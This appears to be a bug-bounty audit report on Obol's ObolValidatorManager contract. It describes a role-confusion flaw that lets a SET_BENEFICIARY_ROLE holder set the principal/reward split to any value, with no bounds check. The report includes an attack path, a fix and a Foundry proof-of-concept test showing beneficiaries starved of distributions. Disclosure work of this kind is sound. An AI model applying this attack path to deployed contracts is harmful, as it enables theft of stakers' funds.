 [H-1] SET_BENEFICIARY_ROLE holder will silently reroute 100% of future distributions to a pre-chosen recipient, starving Obol Validator Manager beneficiaries and reward recipients 

### Summary

ObolValidatorManager.setAmountOfPrincipalStake() is gated by onlyOwnerOrRoles(SET_BENEFICIARY_ROLE). That role is advertised as a low-trust operational key intended only to rotate the beneficiary address. It additionally grants control over the amountOfPrincipalStake split parameter — an economically critical value with no bounds, no decimal validation, and no dedicated role. A SET_BENEFICIARY_ROLE key holder can therefore unilaterally change how every future distribution is split between beneficiary and rewardRecipient without owner authorization. Depending on which party holds the role, this is either unauthorized capability escalation (role holder gains a capability the owner never consented to) or direct theft of the starved recipient's entire future distribution flow. The bounty’s High tier includes "Escalating OVM roles without the owner’s authorization where immediate fund theft is not possible"; the escalation-only variant lands in that clause, and the theft variant confirms real financial harm when key roles overlap. 

### Root Cause

In ObolValidatorManager.sol:setAmountOfPrincipalStake: 

```solidity
function setAmountOfPrincipalStake(uint256 newAmount)
    external
    onlyOwnerOrRoles(SET_BENEFICIARY_ROLE)   // ← wrong role; should be onlyOwner or dedicated role
{
    if (newAmount == amountOfPrincipalStake) return;
    uint256 oldAmount = amountOfPrincipalStake;
    amountOfPrincipalStake = newAmount;      // ← unbounded
    emit PrincipalStakeAmountUpdated(newAmount, oldAmount);
}

```

Two defects compound:
Wrong modifier. SET_BENEFICIARY_ROLE is documented and used elsewhere (setBeneficiary) as a beneficiary-rotation capability. It was never intended to gate the principal/reward split.
No bounds. The factory enforces amountOfPrincipalStake > 0, <= 2048 ether, and multiples of 32 ETH at clone-creation time (ObolValidatorManagerFactory.createObolValidatorManager), but setAmountOfPrincipalStake re-enforces none of those invariants. Any uint256 is accepted — including 0 and type(uint256).max — both of which permanently force 100% of every future distribution to one recipient.
The same access-control choice also lets the role holder starve the other recipient by setting the parameter to any value ≥ the OVM’s free balance  




### Internal Pre-conditions

- {Owner} needs to call grantRoles({user}, SET_BENEFICIARY_ROLE()) to grant the low-trust operational role to some address.
- {user} needs to be non-owner — i.e. the role is genuinely delegated, not held by the owner themselves.
- At least one inflow to the OVM must occur after the parameter is mutated, so that a distributeFunds / distributeFundsPull call routes funds under the corrupted split.
- (Theft variant only) The same {user} must also hold the rewardRecipient address — a plausible single-key setup for a low-trust role on small or operationally lean deployments.


### External Pre-conditions

None. The escalation is fully on-chain, requires no external protocol state, and the SET_BENEFICIARY_ROLE grant is itself a normal owner action in the OVM’s intended operating model.

### Attack Path

1. Owner calls grantRoles(opsKey, SET_BENEFICIARY_ROLE()), intending to delegate only beneficiary rotation.
2. opsKey calls setAmountOfPrincipalStake(0). The call succeeds because the modifier is SET_BENEFICIARY_ROLE, which opsKey holds. The owner has no on-chain veto between the delegation and the call — the modifier was designed to trust this role holder with a strictly smaller capability.
3. All subsequent distributeFunds() / distributeFundsPull() calls classify every future inflow as 100% reward (when the parameter is 0) or 100% principal (when the parameter is ≥ free balance). The PrincipalStakeAmountUpdated event fires exactly like every legitimate update — there is no anomaly signal.
4. Result: beneficiary (or rewardRecipient, in the mirrored case) receives 0 for every cycle until the owner notices and calls setAmountOfPrincipalStake back to the intended value.

### Impact


SET_BENEFICIARY_ROLE holder will silently reroute 100% of every future distribution to a pre-chosen recipient by rewriting the unbounded amountOfPrincipalStake split parameter, without owner authorization. 

### Fix

Two independent changes, both required.

Replace the modifier. The split parameter is economically critical and should not be reachable from any low-trust role:

```solidity
uint256 public constant SET_PRINCIPAL_STAKE_ROLE = 0x40;   // new, distinct from SET_BENEFICIARY_ROLE

function setAmountOfPrincipalStake(uint256 newAmount)
    external
    onlyOwnerOrRoles(SET_PRINCIPAL_STAKE_ROLE)              // or simply onlyOwner
{
    ...
}

```

Enforce the factory-level invariants, so the parameter cannot be driven out of the economically sane band:

```solidity
if (newAmount == 0)              revert InvalidRequest_Params();
if (newAmount % 32 ether != 0)   revert InvalidRequest_Params();
if (newAmount > 2048 ether)      revert InvalidRequest_Params();

```



### POC:

Please add below POC here `test/SecurityPoC_High_RoleConfusion.t.sol `

```solidity
// test/SecurityPoC_High_RoleConfusion.t.sol
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {ObolValidatorManager} from "src/ovm/ObolValidatorManager.sol";
import {ObolValidatorManagerFactory} from "src/ovm/ObolValidatorManagerFactory.sol";
import {SystemContractMock} from "test/ovm/mocks/SystemContractMock.sol";
import {DepositContractMock} from "test/ovm/mocks/DepositContractMock.sol";
import {IENSReverseRegistrar} from "src/interfaces/IENSReverseRegistrar.sol";

/// @notice Proves that SET_BENEFICIARY_ROLE — a low-trust operational role intended
///         only for beneficiary rotation — can silently rewrite the principal/reward
///         split parameter `amountOfPrincipalStake` (unbounded), enabling the role
///         holder to reroute 100% of future distributions. When the role holder is
///         distinct from rewardRecipient, the finding is unauthorized capability
///         escalation; when the same key also serves as rewardRecipient, the same
///         primitive becomes direct theft of the beneficiary's entire future flow.
contract SecurityPoC_High_RoleConfusion is Test {
    address constant ENS = 0x084b1c3C81545d370f3634392De611CaaBFf8148;

    ObolValidatorManagerFactory factory;
    ObolValidatorManager ovm;
    address owner;
    address beneficiary;
    address rewardsRecipient;
    address opsRole;   // SET_BENEFICIARY_ROLE holder — low-trust operational key
    uint64 constant THRESHOLD_GWEI = uint64(16 ether / 1 gwei);

    function setUp() public {
        vm.mockCall(ENS, abi.encodeWithSelector(IENSReverseRegistrar.setName.selector), bytes.concat(bytes32(0)));
        vm.mockCall(ENS, abi.encodeWithSelector(IENSReverseRegistrar.claim.selector), bytes.concat(bytes32(0)));

        factory = new ObolValidatorManagerFactory(
            address(new SystemContractMock(96)),
            address(new SystemContractMock(56)),
            address(new DepositContractMock()),
            "demo.obol.eth",
            ENS,
            address(this)
        );

        owner            = makeAddr("owner");
        beneficiary      = makeAddr("beneficiary");
        rewardsRecipient = makeAddr("rewardsRecipient");
        opsRole          = makeAddr("opsRole");

        ovm = factory.createObolValidatorManager(owner, beneficiary, rewardsRecipient, THRESHOLD_GWEI);
        vm.prank(owner);
        ovm.grantRoles(opsRole, ovm.SET_BENEFICIARY_ROLE());
    }

    // ======================================================================
    // Baseline: the function is role-gated. A role-less caller reverts.
    // This establishes that SET_BENEFICIARY_ROLE is genuinely required to
    // reach the function, and therefore that the escalation below is real.
    // ======================================================================
    function test_Baseline_UnauthorizedCallerReverts() public {
        address rando = makeAddr("rando");
        vm.prank(rando);
        vm.expectRevert(bytes4(0x82b42900));              // Unauthorized
        ovm.setAmountOfPrincipalStake(0);
    }

    // ======================================================================
    // High / primary PoC — the low-trust role silently rewrites the split.
    // Attacker (opsRole) is NOT the rewardRecipient, so they do not profit
    // directly. The victim (beneficiary) loses their future flow to a
    // pre-chosen third party. Unauthorized capability escalation.
    // ======================================================================
    function test_High_SetAmountOfPrincipalStake_RoleEscalation() public {
        // Setup sanity
        assertEq(ovm.owner(), owner);
        assertTrue(ovm.hasAnyRole(opsRole, ovm.SET_BENEFICIARY_ROLE()));
        assertTrue(opsRole != owner, "attacker must not be owner");
        assertTrue(opsRole != rewardsRecipient, "primary PoC: ops != reward");

        // Confirm the role's INTENDED capability still works
        vm.prank(opsRole);
        ovm.setBeneficiary(makeAddr("newBeneficiary"));    // permitted use case

        // ---- VULNERABILITY 1: wrong role gates the split parameter ----
        vm.prank(opsRole);
        ovm.setAmountOfPrincipalStake(0);
        assertEq(ovm.amountOfPrincipalStake(), 0, "role escalated to split control");

        // ---- VULNERABILITY 2: no bounds ----
        vm.prank(opsRole);
        ovm.setAmountOfPrincipalStake(type(uint256).max);
        assertEq(ovm.amountOfPrincipalStake(), type(uint256).max, "unbounded accepted");

        // Restore to the theft-enabling value
        vm.prank(opsRole);
        ovm.setAmountOfPrincipalStake(0);

        // ---- Economic consequence: beneficiary starved, rewardRecipient enriched ----
        vm.deal(address(ovm), 50 ether);
        ovm.distributeFunds();

        assertEq(beneficiary.balance,       0,        "beneficiary starved");
        assertEq(rewardsRecipient.balance,  50 ether, "rewardRecipient got everything");
        assertEq(opsRole.balance,           0,        "opsRole did not profit (escalation-only framing)");
    }

    // ======================================================================
    // High / theft variant — the same primitive becomes direct theft when
    // the same operational key ALSO serves as rewardRecipient (a plausible
    // single-key setup for a low-trust role). This is the profitable case.
    // ======================================================================
    function test_High_EscalationBecomesTheftWhenOpsIsReward() public {
        // Deploy with opsRole as the rewardRecipient
        ObolValidatorManager v = factory.createObolValidatorManager(
            owner, beneficiary, opsRole, THRESHOLD_GWEI
        );
        vm.prank(owner);
        v.grantRoles(opsRole, v.SET_BENEFICIARY_ROLE());

        vm.prank(opsRole);
        v.setAmountOfPrincipalStake(0);

        vm.deal(address(v), 50 ether);
        v.distributeFunds();

        // Direct theft of beneficiary's entire future flow
        assertEq(beneficiary.balance, 0);
        assertEq(opsRole.balance,     50 ether, "attacker stole beneficiary's flow");
    }

    // ======================================================================
    // Mirrored direction — setting the parameter ≥ free balance routes the
    // entire balance to the beneficiary and starves rewardRecipient.
    // ======================================================================
    function test_High_MirroredDirection_RewardStarved() public {
        ObolValidatorManager v = factory.createObolValidatorManager(
            owner, beneficiary, rewardsRecipient, THRESHOLD_GWEI
        );
        vm.prank(owner);
        v.grantRoles(opsRole, v.SET_BENEFICIARY_ROLE());

        vm.prank(opsRole);
        v.setAmountOfPrincipalStake(100 ether);            // ≥ free balance

        vm.deal(address(v), 50 ether);
        v.distributeFunds();

        assertEq(beneficiary.balance,      50 ether, "beneficiary took everything");
        assertEq(rewardsRecipient.balance, 0,        "rewardRecipient starved");
    }
}
```

